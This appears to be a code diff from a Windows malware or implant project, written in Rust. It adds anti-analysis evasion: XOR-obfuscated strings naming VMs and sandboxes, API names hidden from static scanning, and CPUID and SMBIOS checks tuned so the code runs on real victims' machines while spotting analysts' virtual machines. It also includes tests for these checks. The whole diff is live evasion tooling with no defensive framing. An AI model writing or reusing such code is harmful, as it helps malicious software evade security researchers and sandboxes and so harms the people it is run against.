@@ -34,20 +34,30 @@ const CPUID_HYPERVISOR_BIT: u32 = 1 << 31;
 
 /// SMBIOS text that marks a virtual machine. "Microsoft Corporation" is
 /// excluded (it's the OEM string on many real retail Windows 11 boxes).
-const VM_FIRMWARE_TOKEN: &[&[u8]] = &[
-    b"VMWARE",
-    b"VRTUAL",
-    b"INNOTEK",
-    b"VBOX",
-    b"QEMU",
-    b"KVM",
-    b"BOCHS",
-    b"XEN",
-    b"PARALLELS",
-    b"PRL_",
-    b"HYPER-V",
-    b"HVM",
-];
+///
+/// Each token is XOR-encrypted at const-eval ([`crate::xs!`]) so these
+/// sandbox-detection strings never land plaintext in the image; the list is
+/// decoded once and cached.
+fn vm_firmware_tokens() -> &'static [Vec<u8>] {
+    use std::sync::OnceLock;
+    static TOKENS: OnceLock<Vec<Vec<u8>>> = OnceLock::new();
+    TOKENS.get_or_init(|| {
+        vec![
+            crate::xs!("VMWARE", 0x11).into_bytes(),
+            crate::xs!("VRTUAL", 0x22).into_bytes(),
+            crate::xs!("INNOTEK", 0x33).into_bytes(),
+            crate::xs!("VBOX", 0x44).into_bytes(),
+            crate::xs!("QEMU", 0x55).into_bytes(),
+            crate::xs!("KVM", 0x66).into_bytes(),
+            crate::xs!("BOCHS", 0x77).into_bytes(),
+            crate::xs!("XEN", 0x88).into_bytes(),
+            crate::xs!("PARALLELS", 0x99).into_bytes(),
+            crate::xs!("PRL_", 0xAA).into_bytes(),
+            crate::xs!("HYPER-V", 0xBB).into_bytes(),
+            crate::xs!("HVM", 0xCC).into_bytes(),
+        ]
+    })
+}
 
 type NtQueryInformationProcess =
     unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
@@ -87,7 +97,7 @@ fn peb_being_debugged() -> bool {
 
 /// `IsDebuggerPresent()` through its resolved address.
 fn is_debugger_present() -> bool {
-    let Some(addr) = resolve_kernel32("IsDebuggerPresent") else {
+    let Some(addr) = resolve_kernel32(&crate::xs!("IsDebuggerPresent", 0x41)) else {
         return false;
     };
     let f: IsDebuggerPresent = unsafe { std::mem::transmute(addr) };
@@ -99,7 +109,7 @@ fn is_debugger_present() -> bool {
 /// NtQueryInformationProcess debug hints: returns true if a debug port or
 /// debug object handle is present.
 fn query_process_debug_hint() -> bool {
-    let Some(addr) = resolve_ntdll("NtQueryInformationProcess") else {
+    let Some(addr) = resolve_ntdll(&crate::xs!("NtQueryInformationProcess", 0x42)) else {
         return false;
     };
     let f: NtQueryInformationProcess = unsafe { std::mem::transmute(addr) };
@@ -138,11 +148,72 @@ fn query_process_debug_hint() -> bool {
 }
 
 /// CPUID leaf 1 hypervisor-present bit (ECX bit 31). Cheap, no imports, and
-/// un-hookable — a syscall-quality tell.
+/// un-hookable — a syscall-quality tell. **Not conclusive by itself**: Windows
+/// enables the hypervisor on bare metal whenever VBS/HVCI/Core-Isolation is on
+/// (default on modern Win11), so the bit alone false-positives real hardware.
 fn hypervisor_cpuid() -> bool {
     // __cpuid is safe to call; the leaf is valid on all x86-64.
     let r = std::arch::x86_64::__cpuid(CPUID_LEAF1);
     r.ecx & CPUID_HYPERVISOR_BIT != 0
+}
+
+/// CPUID leaf under the hypervisor vendor region (`0x4000_0000`).
+const CPUID_HYPERVISOR_LEAF: u32 = 0x4000_0000;
+
+/// Vendor IDs of *external* hypervisors (from leaf `0x40000000` EBX/ECX/EDX,
+/// 4 characters each). "Microsoft Hv" is deliberately absent: it is the ID
+/// Hyper-V presents to BOTH a genuine Hyper-V guest AND a bare-metal host
+/// running VBS/HVCI — that one is decided by firmware, not CPUID.
+///
+/// Same XOR-at-const-eval treatment as [`vm_firmware_tokens`].
+fn external_vendors() -> &'static [Vec<u8>] {
+    use std::sync::OnceLock;
+    static VENDORS: OnceLock<Vec<Vec<u8>>> = OnceLock::new();
+    VENDORS.get_or_init(|| {
+        vec![
+            crate::xs!("VMwareVMware", 0xA1).into_bytes(),
+            crate::xs!("KVMKVMKVM\0\0\0", 0xB2).into_bytes(),
+            crate::xs!("VBoxVBoxVBox", 0xC3).into_bytes(),
+            crate::xs!("XenVMMXenVMM", 0xD4).into_bytes(),
+            crate::xs!("TCGTCGTCGTCG", 0xE5).into_bytes(), // QEMU (TCG)
+            crate::xs!("ACRNACRNACRN", 0xF6).into_bytes(), // ACRN
+            crate::xs!("bhyve bhyve ", 0x0A).into_bytes(),
+            crate::xs!("prl hyperv", 0x1B).into_bytes(), // Parallels (10 chars; leaf pads to 12)
+            crate::xs!("QNXQVMBSQG", 0x2C).into_bytes(), // QNX
+        ]
+    })
+}
+
+/// Read the hypervisor vendor string when a hypervisor is present. Returns the
+/// 12 bytes from leaf `0x40000000`, or `None` on bare metal (no hypervisor).
+fn hypervisor_vendor() -> Option<[u8; 12]> {
+    if !hypervisor_cpuid() {
+        return None;
+    }
+    let r = std::arch::x86_64::__cpuid(CPUID_HYPERVISOR_LEAF);
+    let mut v = [0u8; 12];
+    v[0..4].copy_from_slice(&r.ebx.to_le_bytes());
+    v[4..8].copy_from_slice(&r.ecx.to_le_bytes());
+    v[8..12].copy_from_slice(&r.edx.to_le_bytes());
+    if v == [0u8; 12] {
+        return None;
+    }
+    Some(v)
+}
+
+/// True when a leaf-`0x40000000` vendor (12 bytes) names a known *external* VM
+/// brand. Patterns shorter than 12 bytes compare as prefixes (Parallels pads).
+/// Pure — the live read wraps this.
+pub(crate) fn vendor_is_external(v: &[u8; 12]) -> bool {
+    external_vendors()
+        .iter()
+        .any(|t| t.len() <= 12 && &v[..t.len()] == t.as_slice())
+}
+
+/// True when the hypervisor vendor is a known *external* VM brand. The bare
+/// hypervisor bit does NOT count — VBS on real hardware sets it too.
+fn external_hypervisor_cpuid() -> bool {
+    hypervisor_vendor().is_some_and(|v| vendor_is_external(&v))
 }
 
 /// Scan the raw SMBIOS buffer for VM vendor text. The vendor/OEM strings live
@@ -154,15 +225,15 @@ fn firmware_has_vm_token(buf: &[u8]) -> bool {
     for &b in buf.iter().take(CAP) {
         upper.push(b.to_ascii_uppercase());
     }
-    VM_FIRMWARE_TOKEN
+    vm_firmware_tokens()
         .iter()
-        .any(|tok| upper.windows(tok.len()).any(|w| w == *tok))
+        .any(|tok| upper.windows(tok.len()).any(|w| w == tok.as_slice()))
 }
 
 /// Read the SMBIOS (RSMB) firmware table via `GetSystemFirmwareTable` and
 /// check it for VM vendor strings. Two-call size/fetch pattern.
 fn firmware_vm_present() -> bool {
-    let Some(addr) = resolve_kernel32("GetSystemFirmwareTable") else {
+    let Some(addr) = resolve_kernel32(&crate::xs!("GetSystemFirmwareTable", 0x43)) else {
         return false;
     };
     let f: GetSystemFirmwareTable = unsafe { std::mem::transmute(addr) };
@@ -184,10 +255,20 @@ fn firmware_vm_present() -> bool {
 }
 
 /// **Anti-VM verdict** — any positive means the host is almost certainly a
-/// VM/analysis box. Combines the wave-1 cheap tells with the new depth:
-/// firmware vendor text (strongest) + CPUID hypervisor bit (un-hookable).
+/// VM/analysis box.
+///
+/// The bare CPUID hypervisor bit is **not** counted: Windows sets it on real
+/// hardware whenever VBS/HVCI is enabled (default on modern Win11), so it alone
+/// would false-positive every bare-metal box that runs Core Isolation. Instead:
+///
+/// - firmware vendor text (SMBIOS VM/OEM strings) — conclusive, catches
+///   Hyper-V/VirtualBox/VMware guests via their firmware strings
+/// - CPUID hypervisor vendor ID (leaf `0x40000000`) — conclusive when it names
+///   an external hypervisor (VMware/KVM/VBox/QEMU/Xen/Parallels/…)
+/// - `"Microsoft Hv"` is the grey zone (a genuine Hyper-V guest vs VBS on bare
+///   metal), so it is left to the firmware prong, never voted on by itself
 pub fn vm_detected() -> bool {
-    firmware_vm_present() || hypervisor_cpuid()
+    firmware_vm_present() || external_hypervisor_cpuid()
 }
 
 /// **Anti-debug verdict** — any positive means a debugger is attached.
@@ -216,6 +297,76 @@ pub fn evasion_check() -> Option<&'static str> {
 mod tests {
     use super::*;
 
+    /// Live diagnostic (ignored): which prong fires, and what vendor ID the
+    /// hypervisor advertises. Useful when triaging a new host's gate result.
+    #[test]
+    #[ignore = "live diagnostic"]
+    fn vm_prong_diagnostic() {
+        eprintln!(
+            "hypervisor_cpuid={} vendor={:?} external={} firmware={} vm_detected={}",
+            hypervisor_cpuid(),
+            hypervisor_vendor(),
+            external_hypervisor_cpuid(),
+            firmware_vm_present(),
+            vm_detected()
+        );
+    }
+
+    #[test]
+    fn microsoft_hv_is_not_external() {
+        // VBS amortizes on this ID — the whole point of the bare-metal fix.
+        assert!(
+            !external_vendors()
+                .iter()
+                .any(|t| t.as_slice() == b"Microsoft Hv")
+        );
+    }
+
+    #[test]
+    fn external_list_contains_only_printable() {
+        for t in external_vendors() {
+            assert!(t.len() <= 12, "vendor {t:?} too long for the leaf");
+            // Plain-ASCII (NUL padding and trailing space are legal in vendor
+            // strings), so byte eq is well-defined.
+            assert!(
+                t.iter()
+                    .all(|&b| b == 0 || b == b' ' || b.is_ascii_graphic())
+            );
+        }
+    }
+
+    #[test]
+    fn external_matcher_rejects_unknown_vendor() {
+        let known: Vec<[u8; 12]> = vec![
+            *b"Microsoft Hv",
+            *b"GenuineIntel",
+            *b"AuthenticAMD",
+            [0u8; 12],
+        ];
+        for v in &known {
+            assert!(
+                !external_vendors()
+                    .iter()
+                    .any(|t| &v[..t.len()] == t.as_slice()),
+                "should reject {v:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn external_matcher_accepts_real_vms() {
+        let vms: Vec<[u8; 12]> = vec![
+            *b"VMwareVMware",
+            *b"KVMKVMKVM\0\0\0",
+            *b"VBoxVBoxVBox",
+            *b"XenVMMXenVMM",
+            *b"TCGTCGTCGTCG",
+        ];
+        for v in &vms {
+            assert!(vendor_is_external(v), "should accept {v:?}");
+        }
+    }
+
     #[test]
     fn rsmb_signature_is_little_endian() {
         // 'R', 'S', 'M', 'B' as a little-endian u32.
@@ -230,7 +381,7 @@ mod tests {
 
     #[test]
     fn vm_tokens_are_upper_case_alnum() {
-        for t in VM_FIRMWARE_TOKEN {
+        for t in vm_firmware_tokens() {
             assert!(!t.is_empty());
             assert!(
                 t.iter()
